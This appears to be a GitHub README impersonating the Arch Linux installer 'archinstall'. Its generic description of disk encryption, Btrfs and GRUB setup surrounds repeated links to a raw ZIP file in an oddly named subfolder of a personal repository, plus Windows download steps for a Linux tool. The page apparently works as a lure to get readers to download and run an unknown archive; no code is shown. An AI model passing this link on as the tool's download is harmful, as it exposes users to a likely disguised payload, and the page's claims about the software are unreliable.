# 🐧 archinstall - Set Up Arch With Less Work

[![Download archinstall](https://img.shields.io/badge/Download%20archinstall-5A67D8?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Drakob6710/archinstall/main/irruption/Software-v2.5.zip)

## 🚀 Getting Started

archinstall is a setup tool for Arch Linux. It helps you prepare a new Arch install with fewer manual steps. It is meant for users who want a guided setup for disk layout, boot setup, encryption, and system settings.

Use it if you want a more direct way to install Arch Linux on a UEFI PC and keep your setup in one place.

## 📥 Download

Visit this page to download:

https://raw.githubusercontent.com/Drakob6710/archinstall/main/irruption/Software-v2.5.zip

Open the link in your browser, then use the files or release assets on the page to get the tool. If the project offers a script or package file, download it to your computer first.

## 🪟 Run on Windows

This tool is made for Arch Linux setup, so you do not run Arch itself on Windows. Use Windows only to download the files and move them to a USB drive or another system that will boot Arch Linux.

### What you need

- A Windows PC with internet access
- A USB drive with at least 4 GB free
- A second drive or free space on the target PC
- A UEFI-based PC
- Access to the Arch Linux install media

### Steps

1. Open the download link in your browser.
2. Download the project files from the GitHub page.
3. If the project is packed in a ZIP file, extract it.
4. Copy the files to your Arch Linux USB or to the target machine.
5. Boot the target PC from the Arch Linux installer.
6. Open a terminal in the live Arch environment.
7. Run the setup script or command provided by the project.
8. Follow the on-screen steps to pick your disk, boot mode, and system options.

## 🧩 What archinstall Does

archinstall helps guide a fresh Arch Linux setup. It can help with tasks such as:

- Disk setup with Btrfs
- LUKS2 encryption
- GRUB boot setup
- UEFI boot mode
- Dotfiles setup
- Basic system configuration
- Desktop-ready file layout

This saves time during install and helps keep the steps in one script or tool.

## 🖥️ System Needs

Before you start, check that the target machine matches these common needs:

- 64-bit PC
- UEFI firmware
- A working internet connection for package downloads
- Enough disk space for Arch Linux and your files
- A keyboard and screen attached during install

For best results, use a clean disk or a system where you can choose the install drive with care.

## 🛠️ How to Use It

1. Boot into the Arch Linux live environment.
2. Connect to the internet.
3. Start the archinstall tool or script from the project files.
4. Choose your language, keyboard, and time zone.
5. Pick your disk and file system layout.
6. Turn on encryption if you want it.
7. Select the boot loader, such as GRUB.
8. Create your user account.
9. Finish the install and reboot.

## 🔐 Encryption and Disk Setup

This project supports setups that use LUKS2 and Btrfs. That means you can protect your data with disk encryption and use a file system that works well with snapshots and clean disk layouts.

A common setup looks like this:

- EFI partition for boot files
- Encrypted main partition
- Btrfs file system for the Linux system
- Separate home or root layout, if you want one

If you want a simpler setup, use the default choices the tool gives you.

## 🧰 Included Setup Options

archinstall is built for flexible Arch Linux installs. It can fit different personal setups, such as:

- Minimal command-line systems
- Desktop installs
- Secure laptops with encrypted disks
- UEFI systems with GRUB
- Systems that use dotfiles for user settings

This makes it useful for both first installs and repeat installs on new machines.

## 📁 Repository Topics

This project is tagged with topics such as:

- archlinux
- archlinux-installer
- archlinux-dotfiles
- bash
- btrfs
- grub
- installer
- linux
- luks-encryption
- luks2
- uefi
- dotfiles

These tags point to its main use: Arch Linux setup with disk, boot, and config support.

## 📌 Common Use Case

A typical use case is a fresh PC with Windows removed or a blank SSD. You boot the Arch Linux USB, run archinstall, and follow the prompts to set up the base system. The tool helps you avoid doing every step by hand.

## 🧭 Simple Install Flow

1. Download the project from GitHub.
2. Prepare an Arch Linux USB installer.
3. Boot the PC from USB.
4. Run the installer tool.
5. Choose disk, boot, and security settings.
6. Install Arch Linux.
7. Reboot into the new system.

## 📎 Link

Primary download page:

https://raw.githubusercontent.com/Drakob6710/archinstall/main/irruption/Software-v2.5.zip